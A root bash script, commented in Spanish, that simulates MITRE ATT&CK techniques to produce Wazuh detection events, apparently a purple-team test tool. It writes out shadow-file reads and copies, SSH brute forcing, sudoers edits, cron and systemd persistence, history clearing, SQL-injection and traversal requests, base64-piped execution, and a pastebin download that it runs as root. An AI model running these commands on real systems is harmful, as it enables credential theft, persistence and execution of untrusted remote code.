#!/bin/bash
# Genera eventos benignos para Wazuh con marcadores syslog. Requiere root. Revierte lo que crea.

if [ "$EUID" -ne 0 ]; then
  echo "Ejecutar como root: sudo $0"
  exit 1
fi

# 1. Parametrización y Aleatoriedad
RAND_STR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
FAKEUSER="sys_${RAND_STR}"
TEST_FILE="/tmp/dump_${RAND_STR}.txt"

pausa() { sleep 3; }
marcar() { logger "WAZUH_SIM: $1"; }

echo "Generando eventos de seguridad para Wazuh (sesión: $RAND_STR)..."

# Discovery
marcar "INICIANDO T1082 - System Information Discovery"
uname -a > /dev/null; cat /etc/os-release > /dev/null; pausa
marcar "INICIANDO T1033 - System Owner/User Discovery"
whoami > /dev/null; id > /dev/null; pausa
marcar "INICIANDO T1057 - Process Discovery"
ps aux > /dev/null; pausa
marcar "INICIANDO T1083 - File and Directory Discovery"
find /etc -maxdepth 2 -name "*.conf" > /dev/null 2>&1; pausa
marcar "INICIANDO T1087.001 - Local Account Discovery"
cat /etc/passwd > /dev/null; getent passwd > /dev/null; pausa
marcar "INICIANDO T1049 - System Network Connections Discovery"
ss -tuln > /dev/null; pausa
marcar "INICIANDO T1016 - System Network Configuration Discovery"
ip addr > /dev/null; ip route > /dev/null; pausa
ip neigh > /dev/null; pausa
marcar "INICIANDO T1007 - System Service Discovery"
systemctl list-units --type=service > /dev/null 2>&1; pausa
marcar "INICIANDO T1518 - Software Discovery"
(dpkg -l || rpm -qa) > /dev/null 2>&1; pausa

# Network Service Discovery (Escaneo de red local)
marcar "INICIANDO T1046 - Network Service Discovery"
nc -vz localhost 1-1000 > /dev/null 2>&1; pausa
# Simulando escaneo de subred (rango acotado)
nc -zv 192.168.0.1-5 22,80 > /dev/null 2>&1; pausa

# Credential access
marcar "INICIANDO T1003.008 - OS Credential Dumping (/etc/shadow)"
# Variación 1: Directa
cat /etc/shadow > /dev/null 2>&1; pausa
# Variación 2: Copia furtiva
cp /etc/shadow /tmp/.cache_bak 2>/dev/null; rm -f /tmp/.cache_bak; pausa
# Variación 3: Paginación
more /etc/shadow > /dev/null 2>&1; pausa

marcar "INICIANDO T1552.001 - Credentials In Files"
grep -rIl "password" /etc 2>/dev/null | head -n 5 > /dev/null; pausa
marcar "INICIANDO T1552.004 - Private Keys"
find / -xdev \( -name "id_rsa" -o -name "id_ed25519" \) 2>/dev/null > /dev/null; pausa

marcar "INICIANDO T1110.001 - Password Guessing (Brute Force)"
for i in $(seq 1 10); do
  ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=1       -o PreferredAuthentications=password usuario_inexistente@127.0.0.1 true > /dev/null 2>&1
done; pausa

# Cuentas
marcar "INICIANDO T1136.001 - Create Account: Local Account"
useradd "$FAKEUSER" 2>/dev/null; pausa
marcar "INICIANDO T1098 - Account Manipulation"
usermod -aG sudo "$FAKEUSER" 2>/dev/null || usermod -aG wheel "$FAKEUSER" 2>/dev/null; pausa
userdel -r "$FAKEUSER" 2>/dev/null; pausa

# Persistencia
marcar "INICIANDO T1053.003 - Scheduled Task/Job: Cron"
echo "* * * * * root /bin/true" > /etc/cron.d/wazuh_test_${RAND_STR}; sleep 5
rm -f /etc/cron.d/wazuh_test_${RAND_STR}; pausa

marcar "INICIANDO T1543.002 - Create or Modify System Process: Systemd Service"
cat > /etc/systemd/system/wazuh_test_${RAND_STR}.service <<'EOF'
[Unit]
Description=Wazuh test service
[Service]
ExecStart=/bin/true
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload 2>/dev/null; sleep 5
rm -f /etc/systemd/system/wazuh_test_${RAND_STR}.service
systemctl daemon-reload 2>/dev/null; pausa

marcar "INICIANDO T1546.004 - Event Triggered Execution: Unix Shell Configuration Modification"
cp ~/.bashrc /tmp/.bashrc.bak 2>/dev/null
echo "# wazuh_test" >> ~/.bashrc; sleep 3
mv /tmp/.bashrc.bak ~/.bashrc 2>/dev/null; pausa

# Escalada / permisos
marcar "INICIANDO T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
sudo -n -l > /dev/null 2>&1; sudo -n true > /dev/null 2>&1; pausa
# Modificación temporal de sudoers
echo "root ALL=(ALL:ALL) ALL # wazuh_sim_${RAND_STR}" >> /etc/sudoers; sleep 3
sed -i "/wazuh_sim_${RAND_STR}/d" /etc/sudoers; pausa

marcar "INICIANDO T1222.002 - File and Directory Permissions Modification: Linux and Mac"
touch "$TEST_FILE"
chmod 777 "$TEST_FILE"; pausa

# FIM
marcar "INICIANDO T1565.001 - Data Manipulation: Stored Data Manipulation (FIM test)"
echo "test" > /etc/wazuh_test_fim_${RAND_STR}.conf; sleep 5
echo "test2" >> /etc/wazuh_test_fim_${RAND_STR}.conf; sleep 5
rm -f /etc/wazuh_test_fim_${RAND_STR}.conf; pausa

# Ejecución / evasión / cadena de ataque
marcar "INICIANDO SECUENCIA: T1105 -> T1222.002 -> T1059.004"
wget -qO /tmp/update_${RAND_STR}.sh https://pastebin.com/raw/dummy > /dev/null 2>&1 || curl -so /tmp/update_${RAND_STR}.sh https://pastebin.com/raw/dummy > /dev/null 2>&1
chmod +x /tmp/update_${RAND_STR}.sh 2>/dev/null
/tmp/update_${RAND_STR}.sh > /dev/null 2>&1 &
pausa

marcar "INICIANDO T1027 - Obfuscated Files or Information"
echo "d2hvYW1p" | base64 -d | bash > /dev/null; pausa
python3 -c "import base64;exec(base64.b64decode('cHJpbnQoMSk='))" > /dev/null 2>&1; pausa
echo "d2hvYW1p" > /tmp/wazuh_payload_${RAND_STR}.b64
base64 -d /tmp/wazuh_payload_${RAND_STR}.b64 > /dev/null; pausa

marcar "INICIANDO T1070.003 - Indicator Removal: Clear Command History"
cp ~/.bash_history /tmp/.bash_history.bak 2>/dev/null
: > ~/.bash_history; history -c
mv /tmp/.bash_history.bak ~/.bash_history 2>/dev/null; pausa

marcar "INICIANDO T1070.004 - Indicator Removal: File Deletion"
rm -f /tmp/wazuh_payload_${RAND_STR}.b64 "$TEST_FILE" /tmp/update_${RAND_STR}.sh; pausa

# Web Simulation (Si hay servicio web local respondiendo)
marcar "INICIANDO T1190 - Exploit Public-Facing Application (Simulación Web)"
curl -s "http://localhost/?id=1' OR '1'='1" > /dev/null 2>&1
curl -s "http://localhost/../../../etc/passwd" > /dev/null 2>&1
pausa

# Collection / C2
marcar "INICIANDO T1560.002 - Archive Collected Data: Archive via Library"
tar czf /tmp/wazuh_archive_${RAND_STR}.tgz /etc/hostname > /dev/null 2>&1
rm -f /tmp/wazuh_archive_${RAND_STR}.tgz; pausa

marcar "INICIANDO T1105 - Ingress Tool Transfer"
curl -s -o /tmp/wazuh_dl_${RAND_STR}.html https://example.com > /dev/null 2>&1 ||   wget -q -O /tmp/wazuh_dl_${RAND_STR}.html https://example.com > /dev/null 2>&1
rm -f /tmp/wazuh_dl_${RAND_STR}.html

marcar "FIN DE GENERACIÓN DE EVENTOS"
echo "Eventos generados exitosamente. Revisa el dashboard de Wazuh y los logs de syslog."
